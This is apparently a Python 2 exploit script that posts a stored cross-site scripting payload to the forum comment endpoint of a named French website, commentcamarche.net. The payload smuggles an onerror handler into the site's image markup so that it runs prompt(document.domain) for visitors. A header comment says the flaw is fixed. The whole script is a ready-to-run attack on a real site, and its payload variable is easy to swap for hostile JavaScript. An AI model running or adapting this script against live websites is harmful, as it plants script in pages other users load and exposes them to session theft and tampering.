#.__                  
#|__|_____     _____  
#|  |\__  \   /     \ 
#|  | / __ \_|  Y Y  \
#|__|(____  /|__|_|  /
#         \/       \/ 
#	[!]Author: IAM
#	[!]Vulnerability: XSS FIXED
#	[!]Target: commentcamarche.net


import urllib,urllib2
import json

newsId = 5865960
cmd = "prompt(document.domain)"
message = "hello word" #Required
preview = 0

def main():
	playload = "[image:http://www.googe.fr/xssed.png|325px||center||' onerror=%s style=display:none root=']%s" % (cmd, message)

	url = 'http://www.commentcamarche.net/'
	directory = 'forum/_xhr_/postmsgfrm/'
	params = urllib.urlencode({'ID':'0',
			'parent':'0',
			'parentx':'0',
			'cat':'103',
			'msg_type':'2',
			'mode':'newc',
			'uftitle':'unknown',
			'message':playload,
			'nom':'iam',
			'login':'',
			'pass':'',
			'pview':preview,
			'ufmodule':'news',
			'ufinfoid':newsId,
			'ufatok':'',
			'_':''})
	request = urllib2.Request(url + directory, params)
	response = urllib2.urlopen(request)
	data = response.read()
	json_data = json.loads(data)
	if json_data["res"] == True:
		print "Attack sended"
		print "%snews/%i" % (url, newsId)
	else:
		print "Attack error"
	pass
if __name__ == '__main__':
	main()
